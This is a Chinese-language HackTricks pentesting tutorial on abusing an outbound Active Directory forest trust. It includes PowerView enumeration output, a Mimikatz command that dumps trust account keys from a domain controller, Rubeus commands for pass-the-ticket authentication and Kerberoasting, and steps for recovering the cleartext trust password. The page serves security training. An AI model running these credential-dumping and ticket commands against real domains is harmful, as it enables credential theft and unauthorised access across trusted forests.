# 外部森林域 - 单向（出站）

{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。

</details>
{% endhint %}

在此场景中 **您的域** 正在 **信任** 来自 **不同域** 的某些 **权限**。

## 枚举

### 出站信任
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Trust Account Attack

当在两个域之间建立信任关系时，存在安全漏洞，这里将其称为域 **A** 和域 **B**，其中域 **B** 将其信任扩展到域 **A**。在此设置中，在域 **A** 中为域 **B** 创建了一个特殊帐户，该帐户在两个域之间的身份验证过程中发挥着关键作用。与域 **B** 关联的此帐户用于加密跨域访问服务的票证。

这里需要理解的关键点是，可以使用命令行工具从域 **A** 的域控制器中提取此特殊帐户的密码和哈希。执行此操作的命令是：
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
此提取之所以可能，是因为该账户名称后带有 **$**，处于活动状态，并且属于域 **A** 的“域用户”组，从而继承了与该组相关的权限。这使得个人可以使用该账户的凭据对域 **A** 进行身份验证。

**警告：** 利用这种情况以用户身份在域 **A** 中获得立足点是可行的，尽管权限有限。然而，这种访问足以对域 **A** 进行枚举。

在 `ext.local` 是信任域而 `root.local` 是被信任域的场景中，将在 `root.local` 中创建一个名为 `EXT$` 的用户账户。通过特定工具，可以转储 Kerberos 信任密钥，从而揭示 `root.local` 中 `EXT$` 的凭据。实现此目的的命令是：
```bash
lsadump::trust /patch
```
在此之后，可以使用提取的 RC4 密钥通过另一个工具命令以 `root.local\EXT$` 身份在 `root.local` 中进行身份验证：
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
此身份验证步骤打开了枚举甚至利用 `root.local` 中服务的可能性，例如执行 Kerberoast 攻击以提取服务帐户凭据，使用：
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### 收集明文信任密码

在之前的流程中，使用了信任哈希而不是**明文密码**（该密码也被**mimikatz**提取）。

明文密码可以通过将mimikatz的\[ CLEAR ]输出从十六进制转换并去除空字节‘\x00’来获得：

![](<../../.gitbook/assets/image (938).png>)

有时在创建信任关系时，用户必须输入信任的密码。在这个演示中，密钥是原始信任密码，因此是人类可读的。随着密钥的循环（30天），明文将不再是人类可读的，但在技术上仍然可以使用。

明文密码可以用作信任账户进行常规身份验证，作为使用信任账户的Kerberos密钥请求TGT的替代方案。在这里，从ext.local查询root.local的Domain Admins成员：

![](<../../.gitbook/assets/image (792).png>)

## 参考文献

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

{% hint style="success" %}
学习与实践AWS黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习与实践GCP黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持HackTricks</summary>

* 查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**Telegram群组**](https://t.me/peass)或**在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**上关注我们。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub库提交PR分享黑客技巧。

</details>
{% endhint %}
